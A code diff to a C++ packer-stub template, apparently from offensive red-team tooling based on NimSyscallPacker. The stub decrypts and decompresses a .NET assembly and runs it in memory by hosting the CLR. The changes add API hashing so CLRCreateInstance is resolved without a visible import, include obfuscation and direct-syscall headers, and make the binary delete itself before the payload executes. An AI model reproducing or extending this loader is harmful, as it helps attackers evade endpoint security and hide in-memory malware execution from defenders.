@@ -2,12 +2,10 @@
 // Based on NimSyscallPacker's Csharp module by @ShitSecure
 #include <windows.h>
 #include <winternl.h>
-#include <metahost.h>
-#include <mscoree.h>
-
-#pragma comment(lib, "mscoree.lib")
 
 #include "obfuscate.hpp.in"
+#include "api_hashing.hpp.in"
+#include "clr_defs.hpp.in"
 #include "syscalls.hpp.in"
 #include "crypto_stub.hpp.in"
 #include "common.hpp.in"
@@ -27,10 +25,16 @@ static constexpr size_t ORIGINAL_SIZE = {{ORIGINAL_SIZE}};
 static void run_dotnet_assembly(uint8_t* assembly_data, size_t assembly_size) {
     HRESULT hr;
 
-    // CLRCreateInstance
+    // Dynamically resolve CLRCreateInstance from mscoree.dll
+    auto hMscoree = load_module(L"mscoree.dll");
+    if (!hMscoree) return;
+    auto pCLRCreateInstance = reinterpret_cast<CLRCreateInstance_fn>(
+        resolve_function(hMscoree, HASHA("CLRCreateInstance")));
+    if (!pCLRCreateInstance) return;
+
     ICLRMetaHost* pMetaHost = nullptr;
-    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
-                           reinterpret_cast<LPVOID*>(&pMetaHost));
+    hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
+                            reinterpret_cast<LPVOID*>(&pMetaHost));
     if (FAILED(hr)) return;
 
     // Get latest runtime
@@ -93,7 +97,7 @@ static void run_dotnet_assembly(uint8_t* assembly_data, size_t assembly_size) {
     }
 
     _AppDomain* pAppDomain = nullptr;
-    hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain),
+    hr = pAppDomainThunk->QueryInterface(IID_AppDomain,
                                           reinterpret_cast<LPVOID*>(&pAppDomain));
     pAppDomainThunk->Release();
     if (FAILED(hr)) {
@@ -254,6 +258,9 @@ int main() {
         HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
     size_t decompressed_len = ORIGINAL_SIZE + 256;
     decompress_zlib(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len);
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
     run_dotnet_assembly(decompressed, decompressed_len);
     HeapFree(GetProcessHeap(), 0, decompressed);
 {{#ENDIF}}
@@ -262,18 +269,20 @@ int main() {
         HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
     size_t decompressed_len = ORIGINAL_SIZE + 256;
     decompress_lz4(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len);
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
     run_dotnet_assembly(decompressed, decompressed_len);
     HeapFree(GetProcessHeap(), 0, decompressed);
 {{#ENDIF}}
 {{#IF COMPRESS_NONE}}
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
     run_dotnet_assembly(decrypted, decrypted_len);
 {{#ENDIF}}
 
     HeapFree(GetProcessHeap(), 0, decrypted);
-
-{{#IF SELF_DELETE}}
-    self_delete();
-{{#ENDIF}}
 
     return 0;
 }
